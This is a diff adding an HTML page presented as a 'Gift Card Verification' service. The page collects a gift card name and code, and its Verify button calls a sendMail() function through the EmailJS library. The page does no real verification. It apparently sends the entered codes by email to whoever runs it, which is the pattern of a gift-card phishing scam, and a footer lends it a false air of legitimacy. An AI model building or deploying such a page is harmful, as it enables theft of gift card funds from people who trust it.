@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Gift Card Verification</title>
+
+<link rel="stylesheet" href="style.css">
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<script>
+(function(){
+   emailjs.init("RxjG9oUoV13sW1z8O");
+})();
+</script>
+
+</head>
+
+<body>
+
+<h2>Verify your Gift Card</h2>
+
+<div id="gift-card-form">
+
+<input type="text" id="giftCardName"
+oninput="this.value=this.value.toUpperCase()"
+placeholder="Enter Gift Card Name">
+
+<input type="text" id="giftCardCode"
+oninput="this.value=this.value.toUpperCase()"
+placeholder="Enter Gift Card Code">
+
+<button onclick="sendMail()">Verify</button>
+
+<p id="responseMessage"></p>
+
+</div>
+
+<footer>
+<p>Made in United States of America to verify Giftcard</p>
+<p>© 2025 ITera. All Rights Reserved.</p>
+</footer>
+
+<script src="script.js"></script>
+
+</body>
+</html>
